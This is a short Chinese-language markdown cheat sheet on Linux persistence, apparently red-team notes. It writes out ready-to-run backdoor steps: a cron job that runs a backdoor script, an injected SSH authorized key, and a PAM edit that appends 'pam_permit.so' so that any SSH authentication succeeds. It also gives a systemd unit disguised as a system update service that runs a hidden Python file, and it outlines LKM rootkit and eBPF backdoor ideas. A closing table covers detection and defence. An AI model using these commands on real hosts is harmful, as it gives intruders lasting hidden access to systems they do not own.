# Linux 权限维持

## 用户态持久化

### Cron Job
```bash
(crontab -l 2>/dev/null; echo "*/5 * * * * /path/to/backdoor.sh") | crontab -
```

### SSH 后门
```bash
# 植入授权密钥
echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# SSH 包装器（PAM 后门）
cp /etc/pam.d/sshd /etc/pam.d/sshd.bak
echo 'auth sufficient pam_permit.so' >> /etc/pam.d/sshd
```

### Systemd Service
```ini
[Unit]
Description=System Update Service

[Service]
Type=simple
ExecStart=/usr/bin/python3 /opt/.system-update.py
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

## 内核态持久化

### LKM Rootkit
- 隐藏进程、文件、网络连接
- 关键系统调用劫持（sys_call_table）
- 用户态不可见

### BPF 后门
- eBPF 程序注入内核
- 无内核模块痕迹
- 对用户态完全透明

## 检测与防御

| 持久化类型 | 检测方法 | 防御 |
|-----------|---------|------|
| Cron | Auditd 规则 | 禁用不必要的 cron |
| SSH Key | 定期审计 authorized_keys | 强制双因子认证 |
| Systemd | systemctl list-units | 服务签名验证 |
| LKM | 内核模块列表比对 | 模块签名强制加载 |
| BPF | bpftool 程序列举 | BPF LSM 沙箱 |
